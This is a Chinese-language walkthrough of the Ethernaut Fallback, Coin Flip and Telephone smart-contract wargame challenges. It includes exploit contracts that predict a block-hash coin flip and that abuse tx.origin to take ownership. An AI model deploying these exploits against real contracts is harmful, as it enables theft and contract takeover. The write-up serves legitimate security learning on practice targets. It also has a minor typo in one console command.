https://ethernaut.openzeppelin.com/

# challenges

## Fallback

此challenge重点在[fallback函数](https://docs.soliditylang.org/en/latest/contracts.html?highlight=fallback#fallback-function)

fallback函数在以下情况会执行：
- 调用该合约中不存在的函数
- 有账户向该合约发送以太币(没有相应的接收函数)

通过`contract.sentTransaction({value: 1})`即可调用`fallback()`函数

## Coin Flip

此challenge重点在随机数安全

通过challenge的条件是连续猜对十个bool值，该bool是从上一个区块的哈希值计算出：
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
```

上一个区块的哈希值是链上公开数据。解决方法是：自己部署一个合约，用相同的逻辑计算出该bool值，再调用challenge中的合约把事先计算出的答案传递过去。

```solidity
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
import './coinflip.sol';

contract CoinFlipPoc {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip target;
  
  constructor (address adimAddr) public {
      target = CoinFlip(adimAddr);
  }

  function hack() public {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      uint256 coinFlip =uint256(uint256(blockValue) / FACTOR);
      bool guess = coinFlip == 1 ? true : false;
      target.flip(guess);
  }
}
```

## Telephone

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

[官方文档](https://docs.soliditylang.org/en/latest/cheatsheet.html?highlight=tx.origin#global-variables)
`tx.origin`和`msg.sender`的区别

- `msg.sender` (address): sender of the message (current call)
- `tx.origin` (address): sender of the transaction (full call chain)

然后合约中可以调用其他合约。自己起个合约调用challenge合约中的`changeOwner`函数即可。
此时`tx.origin`就是我的地址，`msg.sender`是我部署的合约的地址。

```solidity
pragma solidity ^0.6.0;

import './telephone.sol';

contract Exp_Telephone {

  Telephone public aim;

  constructor(address _aim) public {
    aim = Telephone(_aim);
  }

  function hack(address me) public {
    aim.changeOwner(me);
  }
}
```